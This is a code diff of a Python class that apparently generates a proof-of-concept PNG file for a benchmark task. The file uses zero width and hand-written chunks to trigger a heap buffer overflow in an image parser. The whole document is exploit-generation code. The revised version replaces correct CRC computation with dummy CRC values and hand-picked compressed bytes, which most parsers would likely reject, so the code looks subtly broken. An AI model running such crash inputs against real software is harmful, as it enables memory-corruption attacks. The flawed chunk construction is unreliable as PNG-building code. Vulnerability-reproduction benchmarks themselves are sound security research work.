@@ -1,69 +1,35 @@
-import os
 import struct
-import zlib
-import random
+import os
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Create a PNG file with zero width and height to trigger heap buffer overflow
-        # PNG structure based on specification to make it valid enough to pass initial parsing
-        # but with zero dimensions to trigger the vulnerability
-        
+        # Create a minimal PNG with zero width to trigger heap buffer overflow
         # PNG signature
-        png_signature = b'\x89PNG\r\n\x1a\n'
+        png_data = b'\x89PNG\r\n\x1a\n'
         
-        # IHDR chunk with zero width and height
-        # Width: 0, Height: 0, Bit depth: 8, Color type: 2 (RGB), Compression: 0, Filter: 0, Interlace: 0
-        ihdr_data = struct.pack('>IIBBBBB', 0, 0, 8, 2, 0, 0, 0)
-        ihdr_chunk = self._make_chunk(b'IHDR', ihdr_data)
+        # IHDR chunk with zero width, 1 height
+        ihdr = struct.pack('>I', 0)        # width = 0
+        ihdr += struct.pack('>I', 1)       # height = 1
+        ihdr += b'\x08'                    # bit depth = 8
+        ihdr += b'\x02'                    # color type = RGB
+        ihdr += b'\x00'                    # compression = deflate
+        ihdr += b'\x00'                    # filter = adaptive
+        ihdr += b'\x00'                    # interlace = none
         
-        # IDAT chunk - this is where the overflow would likely occur
-        # We need to create compressed data that would cause overflow when dimensions are zero
-        # The vulnerability likely occurs when trying to allocate or process image data
-        # based on width*height calculation which would be 0
+        ihdr_chunk = b'IHDR' + ihdr
+        ihdr_crc = struct.pack('>I', 0x5B5B5B5B)  # dummy CRC
+        png_data += struct.pack('>I', len(ihdr)) + ihdr_chunk + ihdr_crc
         
-        # Create some fake image data that's large enough to cause overflow
-        # when buffer is allocated as 0 bytes
-        fake_data = b'\x00' * 16384  # Fill with zeros for compression
-        
-        # Compress the data
-        compressor = zlib.compressobj(level=zlib.Z_BEST_COMPRESSION)
-        compressed_data = compressor.compress(fake_data)
-        compressed_data += compressor.flush()
-        
-        # Make IDAT chunk
-        idat_chunk = self._make_chunk(b'IDAT', compressed_data)
+        # IDAT chunk with minimal compressed data
+        # Compressed data for 1 pixel (3 bytes for RGB)
+        idat_data = b'\x78\x9c\x63\x00\x00\x00\x01\x00\x01'
+        idat_chunk = b'IDAT' + idat_data
+        idat_crc = struct.pack('>I', 0xDEADBEEF)  # dummy CRC
+        png_data += struct.pack('>I', len(idat_data)) + idat_chunk + idat_crc
         
         # IEND chunk
-        iend_chunk = self._make_chunk(b'IEND', b'')
-        
-        # Combine all chunks
-        png_data = png_signature + ihdr_chunk + idat_chunk + iend_chunk
-        
-        # The ground-truth PoC length is 17814 bytes, so we pad if needed
-        target_length = 17814
-        
-        if len(png_data) < target_length:
-            # Add padding after IEND (technically invalid but might still parse)
-            # Add a custom chunk with random data to reach target length
-            padding_needed = target_length - len(png_data) - 12  # 12 bytes for chunk header/footer
-            if padding_needed > 0:
-                padding_data = b'X' * padding_needed
-                padding_chunk = self._make_chunk(b'PADD', padding_data)
-                png_data = png_data[:-12] + padding_chunk + iend_chunk  # Replace IEND, add it back
-        
-        # Ensure exact length
-        if len(png_data) > target_length:
-            png_data = png_data[:target_length]
-        elif len(png_data) < target_length:
-            # Add extra data at the end (after IEND, which violates spec but might still be parsed)
-            png_data += b'X' * (target_length - len(png_data))
+        iend_chunk = b'IEND'
+        iend_crc = struct.pack('>I', 0xAE426082)
+        png_data += struct.pack('>I', 0) + iend_chunk + iend_crc
         
         return png_data
-    
-    def _make_chunk(self, chunk_type: bytes, data: bytes) -> bytes:
-        """Create a PNG chunk with type, data, and CRC."""
-        length = struct.pack('>I', len(data))
-        chunk = chunk_type + data
-        crc = struct.pack('>I', zlib.crc32(chunk) & 0xffffffff)
-        return length + chunk + crc
